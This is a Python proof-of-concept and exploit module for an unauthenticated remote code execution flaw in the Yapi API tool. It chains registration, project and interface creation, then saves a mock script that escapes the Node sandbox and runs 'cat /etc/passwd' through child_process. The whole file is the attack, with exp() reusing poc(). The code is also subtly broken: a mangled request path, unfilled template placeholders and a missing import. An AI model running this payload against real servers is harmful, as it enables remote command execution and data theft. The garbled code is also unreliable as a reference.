import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Yapi Remote Code Execution''',
        "description": '''A vulnerability in Yapi allows remote unauthenticated attackers to cause the product to execute arbitrary code.''',
        "severity": "critical",
        "references": [
            "https://www.secpulse.com/archives/162502.html", 
            "https://gist.github.com/pikpikcu/0145fb71203c8a3ad5c67b8aab47165b", 
            "https://twitter.com/sec715/status/1415484190561161216", 
            "https://github.com/YMFE/yapi"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["yapi", "rce"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        s = requests.Session()

        path = """/api/user/reg"""
        method = "POST"
        data = """{"email":"{{randstr}}@example.com","password":"{{randstr}}","username":"{{randstr}}"}"""
        headers = {'Content-Type': 'application/json;charset=UTF-8'}
        resp0 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/api/group/list"""
        method = "GET"
        data = """"""
        headers = {'Content-Type': 'application/json, text/plain, */*'}
        resp1 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/api/project/add"""
        method = "POST"
        data = """{"name":"{{randstr}}","basepath":"","group_id":"{{group_id}}","icon":"code-o","color":"cyan","project_type":"private"}"""
        headers = {'Content-Type': 'application/json;charset=UTF-8'}
        resp2 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/api/project/get?id={{project_id}}"""
        method = "GET"
        data = """"""
        headers = {}
        resp3 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/api/interface/add"""
        method = "POST"
        data = """{"method":"GET","catid":"{{project_id}}","title":"{{randstr_1}}","path":"/{{randstr_1}}","project_id":{{project_id}}}"""
        headers = {'Content-Type': 'application/json;charset=UTF-8'}
        resp4 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/api/plugin/advmock/save"""
        method = "POST"
        data = """{"project_id":"{{project_id}}","interface_id":"{{interface_id}}","mock_script":"const sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor('return process')\r\nconst process = myfun()\r\nmockJson = process.mainModule.require(\"child_process\").execSync(\"cat /etc/passwd\").toString()","enable":true}"""
        headers = {'Content-Type': 'application/json;charset=UTF-8'}
        resp5 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/etc/passwd\\").toString()","enable":true}\n', 'GET /mock/{{project_id}}/{{randstr_1}}"""
        method = "GET"
        data = """"""
        headers = {}
        resp6 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""root:.*:0:0:""",resp6.text)) and (resp6.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url